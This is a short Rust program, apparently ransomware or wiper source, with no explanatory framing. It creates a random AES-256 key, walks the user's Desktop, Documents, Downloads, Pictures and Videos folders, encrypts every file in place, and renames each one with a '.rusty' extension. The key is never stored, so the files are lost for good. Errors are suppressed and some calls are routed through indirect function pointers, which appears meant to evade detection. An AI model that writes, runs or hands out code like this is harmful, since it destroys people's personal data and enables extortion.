use aes::Aes256;
use block_modes::{BlockMode, Cbc};
use block_modes::block_padding::Pkcs7;
use walkdir::WalkDir;
use rand::{Rng, thread_rng};
use rand::distributions::Standard;
use std::fs::{self, File};
use std::io::{Read, Write};
use std::path::PathBuf;
use std::convert::TryInto;
type EncCbc = Cbc<Aes256, Pkcs7>;
type GenKeyIvFn = fn() -> ([u8; 32], [u8; 16]);
type EncFileFn = fn(&PathBuf, &[u8; 32], &[u8; 16]) -> std::io::Result<()>;

fn gen_key_iv() -> ([u8; 32], [u8; 16]) {
    let rng = thread_rng();
    let key: [u8; 32] = rng.sample_iter(&Standard).take(32).collect::<Vec<u8>>().try_into().unwrap();
    let iv: [u8; 16] = thread_rng().sample_iter(&Standard).take(16).collect::<Vec<u8>>().try_into().unwrap();
    (key, iv)
}
fn rfc(path: &PathBuf) -> std::io::Result<Vec<u8>> {
    let mut file_content = Vec::new();
    let mut file = File::open(&path)?;
    file.read_to_end(&mut file_content)?;
    Ok(file_content)
}
fn wfc(path: &PathBuf, content: &[u8]) -> std::io::Result<()> {
    let mut file = File::create(&path)?;
    file.write_all(content)?;
    Ok(())
}

fn ren_f(path: &PathBuf, new_extension: &str) -> std::io::Result<()> {
    let new_path = path.with_extension(new_extension);
    fs::rename(path, new_path)?;
    Ok(())
}

fn enc_f(path: &PathBuf, key: &[u8; 32], iv: &[u8; 16]) -> std::io::Result<()> {
    let file_content = rfc(path)?;
    let cipher = EncCbc::new_from_slices(key, iv).unwrap();
    let ciphertext = cipher.encrypt_vec(&file_content);
    wfc(path, &ciphertext)?;
    ren_f(path, "rusty")?;
    Ok(())
}

fn main() -> std::io::Result<()> {
    let home_d = dirs::home_dir().expect("where home?");
    let dirs_to_enc = vec![
        home_d.join("Desktop"),
        home_d.join("Documents"),
        home_d.join("Downloads"),
        home_d.join("Pictures"),
        home_d.join("Videos"),
    ];
    
    let gen_key_iv_fn: GenKeyIvFn = gen_key_iv;
    let enc_f_fn: EncFileFn = enc_f;
    let (key, iv) = gen_key_iv_fn();
    let indirect_walkdir_new = WalkDir::new;
    let indirect_walkdir_iter = WalkDir::into_iter;
    let indirect_result_ok = Result::ok;
    let indirect_is_file = |e: &walkdir::DirEntry| e.file_type().is_file();

    for dir in dirs_to_enc {
        let walkdir = indirect_walkdir_new(dir);
        for entry in indirect_walkdir_iter(walkdir)
            .filter_map(indirect_result_ok)
            .filter(indirect_is_file) {
            let path = entry.path().to_path_buf();
            if let Err(_) = enc_f_fn(&path, &key, &iv) {}
        }
    }
    Ok(())
}
